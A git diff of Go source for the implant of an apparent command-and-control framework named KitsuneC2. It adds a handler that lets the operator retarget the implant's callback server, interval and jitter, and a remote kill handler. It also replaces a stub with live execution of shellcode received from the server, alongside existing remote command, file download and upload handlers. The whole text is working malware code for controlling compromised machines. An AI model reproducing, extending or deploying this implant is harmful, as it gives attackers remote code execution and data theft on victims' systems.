@@ -1,13 +1,15 @@
 package main
 
 import (
+	"KitsuneC2/implant/config"
 	"KitsuneC2/implant/modules"
 	"KitsuneC2/lib/communication"
-	"errors"
 	"net"
 )
 
 var MessageTypeToFunc = map[int]func(net.Conn, interface{}){
+	5: handleImplantKillReq,
+	7: handleImplantConfigReq,
 	//reserved for implant functionality
 	11: handleFileInfoReq,
 	13: handleLsReq,
@@ -16,6 +18,39 @@ var MessageTypeToFunc = map[int]func(net.Conn, interface{}){
 	19: handleDownloadReq,
 	21: handleUploadReq,
 	23: handleShellcodeExecReq,
+}
+
+func handleImplantConfigReq(conn net.Conn, arguments interface{}) {
+	ImplantConfigReq, ok := arguments.(*communication.ImplantConfigReq)
+	if !ok {
+		return
+	}
+
+	if ImplantConfigReq.ServerIp != "" {
+		config.ServerIp = ImplantConfigReq.ServerIp
+	}
+	if ImplantConfigReq.ServerPort > 0 && ImplantConfigReq.ServerPort < 65535 {
+		config.ServerPort = ImplantConfigReq.ServerPort
+	}
+	if ImplantConfigReq.CallbackJitter > 0 {
+		config.CallbackJitter = ImplantConfigReq.CallbackJitter
+	}
+	if ImplantConfigReq.CallbackInterval > 0 {
+		config.CallbackInterval = ImplantConfigReq.CallbackInterval
+	}
+
+	resp := communication.ImplantConfigResp{TaskId: ImplantConfigReq.TaskId, Success: true}
+	SendEnvelopeToServer(conn, 8, resp)
+}
+
+func handleImplantKillReq(conn net.Conn, arguments interface{}) {
+	implantKillReq, ok := arguments.(*communication.ImplantKillReq)
+	if !ok {
+		return
+	}
+	shouldTerminate = true
+	resp := communication.ImplantKillResp{ImplantId: implantId, TaskId: implantKillReq.TaskId}
+	SendEnvelopeToServer(conn, 6, resp)
 }
 
 func handleFileInfoReq(conn net.Conn, arguments interface{}) {
@@ -55,10 +90,9 @@ func handleExecReq(conn net.Conn, arguments interface{}) {
 	if err != nil {
 		SendErrorToServer(conn, execReq.TaskId, err)
 	} else {
-		resp := communication.ExecResp{TaskId: execReq.TaskId, Output: result}
+		resp := communication.ExecResp{TaskId: execReq.TaskId, Output: string(result)}
 		SendEnvelopeToServer(conn, 16, resp)
 	}
-
 }
 
 func handleCdReq(conn net.Conn, arguments interface{}) {
@@ -103,11 +137,13 @@ func handleUploadReq(conn net.Conn, arguments interface{}) {
 	}
 }
 
-// TODO
 func handleShellcodeExecReq(conn net.Conn, arguments interface{}) {
 	shellcodeExecReq, ok := arguments.(*communication.ShellcodeExecReq)
 	if !ok {
 		return
 	}
-	SendErrorToServer(conn, shellcodeExecReq.TaskId, errors.New("functionality not yet implemented"))
+
+	modules.ShellcodeExec(shellcodeExecReq.Shellcode)
+	resp := communication.ShellcodeExecResp{TaskId: shellcodeExecReq.TaskId, Success: true}
+	SendEnvelopeToServer(conn, 24, resp)
 }
